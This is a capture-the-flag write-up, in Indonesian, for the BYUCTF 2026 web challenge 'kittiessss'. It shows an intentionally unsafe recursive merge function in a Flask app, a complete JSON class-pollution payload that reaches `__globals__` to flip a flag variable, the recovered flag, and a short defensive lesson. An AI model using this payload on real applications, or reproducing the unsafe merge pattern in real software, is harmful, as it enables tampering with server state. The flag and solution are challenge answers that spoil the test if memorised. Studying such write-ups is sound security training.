---
ctf: "BYUCTF 2026"
kategori: "Web Exploitation"
challenge: "kittiessss"
flag: "byuctf{y0u_m4d3_k1tty_h4ppy}"
teknik: "Prototype pollution Python lewat __class__ → to_dict.__globals__ → menyetel give_flag=True"
sumber: "https://github.com/Abdelkad3r/byuctf-2026"
---

# kittiessss — BYUCTF 2026 (Web Exploitation)

## Deskripsi Singkat

Sebuah Flask cat-maker kecil. Form-nya mengirim JSON `{name, age, color}` ke `/cat`, yang me-`merge(data, Cat())` input ke instance `Cat` baru, lalu me-render. Sebuah global modul terpisah `give_flag = False` menggerbangi template tersembunyi `flag.html`.

## Analisis

```python
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))      # ← titik pijakannya
        else:
            setattr(dst, k, v)
```

Instance `Cat` tidak punya `__getitem__`, jadi key bernilai-dict jatuh ke `merge(v, getattr(dst, k))`. Rantai introspeksi Python-nya:

```text
Instance Cat  ──__class__──▶  Cat (class-nya)
Class Cat     ──to_dict───▶  <function Cat.to_dict>
function      ──__globals__▶ globals modul (sebuah dict)
dict modul    ──setitem────▶ give_flag = True
```

Payload-nya:

```json
{
  "name": "x", "age": 1, "color": "black",
  "is_happy": true,
  "__class__": {
    "to_dict": {
      "__globals__": { "give_flag": true }
    }
  }
}
```

## Eksploitasi / Solusi

Setelah merge, `give_flag` menyala, `is_happy` true, route-nya me-render `flag.html`:

```
byuctf{y0u_m4d3_k1tty_h4ppy}
```

## Catatan / Insight

**Pelajaran untuk defender:** fungsi merge rekursif yang tidak meng-blocklist `__class__`, `__bases__`, `__globals__`, `__init__`, `__builtins__` adalah padanan Python dari kelas bug prototype-pollution di JS. Pakai `dict.update` pada keyspace yang sudah diketahui aman, atau — lebih baik lagi — jangan pernah menggabungkan JSON dari attacker ke dalam object graph yang hidup.

## Flag

```
byuctf{y0u_m4d3_k1tty_h4ppy}
```
